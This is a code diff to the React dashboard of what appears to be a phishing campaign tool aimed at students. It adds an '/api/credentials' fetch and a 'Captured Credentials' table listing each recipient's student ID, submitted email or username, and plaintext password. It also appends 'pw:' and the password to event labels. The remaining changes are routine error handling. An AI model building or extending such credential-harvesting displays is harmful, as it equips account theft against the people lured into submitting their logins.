@@ -45,9 +45,12 @@ function eventLabel(event) {
 
 function eventDisplayId(event) {
   if (event.event === 'credentials_submitted') {
-    if (event.student_id) return `ID: ${event.student_id}`;
-    if (event.submitted_value) return event.submitted_value;
-    if (event.email && !event.recipient_email) return event.email;
+    const parts = [];
+    if (event.student_id) parts.push(`ID: ${event.student_id}`);
+    else if (event.submitted_email) parts.push(event.submitted_email);
+    else if (event.submitted_value) parts.push(event.submitted_value);
+    if (event.submitted_password) parts.push(`pw: ${event.submitted_password}`);
+    if (parts.length) return parts.join(' · ');
   }
   return event.display_id || event.recipient_email || event.email || 'unknown';
 }
@@ -65,20 +68,40 @@ export default function Dashboard() {
   const [campaigns, setCampaigns] = useState([]);
   const [overall, setOverall] = useState(null);
   const [events, setEvents] = useState([]);
+  const [credentials, setCredentials] = useState([]);
   const [loading, setLoading] = useState(true);
+  const [error, setError] = useState(null);
 
   const fetchData = useCallback(async () => {
     try {
-      const [campaignsData, resultsData, eventsData] = await Promise.all([
+      const [campaignsRes, resultsRes, eventsRes, credentialsRes] = await Promise.allSettled([
         apiFetch('/api/campaigns'),
         apiFetch('/api/results/all'),
         apiFetch('/api/events?limit=20'),
+        apiFetch('/api/credentials'),
       ]);
-      setCampaigns(campaignsData);
-      setOverall(resultsData.overall);
-      setEvents(eventsData);
+
+      if (campaignsRes.status === 'fulfilled') {
+        setCampaigns(campaignsRes.value);
+        setError(null);
+      } else {
+        setError('Cannot reach API server. Is it running on http://localhost:4000?');
+      }
+
+      if (resultsRes.status === 'fulfilled') {
+        setOverall(resultsRes.value.overall);
+      }
+
+      if (eventsRes.status === 'fulfilled') {
+        setEvents(eventsRes.value);
+      }
+
+      if (credentialsRes.status === 'fulfilled') {
+        setCredentials(credentialsRes.value);
+      }
     } catch (err) {
       console.error(err);
+      setError(err.message);
     } finally {
       setLoading(false);
     }
@@ -139,6 +162,12 @@ export default function Dashboard() {
 
   return (
     <div>
+      {error && (
+        <div className="mb-4 px-4 py-3 rounded-lg bg-accent/15 border border-accent/40 text-accent text-sm">
+          {error}
+        </div>
+      )}
+
       <div className="flex items-center justify-between mb-6">
         <div>
           <h1 className="text-2xl font-bold text-white">Dashboard</h1>
@@ -256,6 +285,42 @@ export default function Dashboard() {
             )}
           </div>
         </div>
+      </div>
+
+      <div className="card mt-6">
+        <h2 className="text-lg font-semibold text-white mb-4">Captured Credentials</h2>
+        {credentials.length === 0 ? (
+          <p className="text-gray-500 text-sm">No credentials submitted yet.</p>
+        ) : (
+          <div className="overflow-x-auto">
+            <table className="w-full text-sm">
+              <thead>
+                <tr className="text-gray-500 border-b border-border">
+                  <th className="text-left py-2 px-2">Time</th>
+                  <th className="text-left py-2 px-2">Campaign</th>
+                  <th className="text-left py-2 px-2">Template</th>
+                  <th className="text-left py-2 px-2">Recipient</th>
+                  <th className="text-left py-2 px-2">Student ID</th>
+                  <th className="text-left py-2 px-2">Email / Username</th>
+                  <th className="text-left py-2 px-2">Password</th>
+                </tr>
+              </thead>
+              <tbody>
+                {credentials.map((c) => (
+                  <tr key={c.id} className="border-b border-border/50 hover:bg-accent/5">
+                    <td className="py-2 px-2 text-xs text-gray-400">{timeAgo(c.timestamp)}</td>
+                    <td className="py-2 px-2 text-white">{c.campaign_name}</td>
+                    <td className="py-2 px-2 capitalize text-gray-400">{c.template}</td>
+                    <td className="py-2 px-2 font-mono text-xs">{c.recipient_email || '—'}</td>
+                    <td className="py-2 px-2 font-mono text-xs text-warning">{c.student_id || '—'}</td>
+                    <td className="py-2 px-2 font-mono text-xs">{c.submitted_email || '—'}</td>
+                    <td className="py-2 px-2 font-mono text-xs text-accent">{c.password || '—'}</td>
+                  </tr>
+                ))}
+              </tbody>
+            </table>
+          </div>
+        )}
       </div>
     </div>
   );
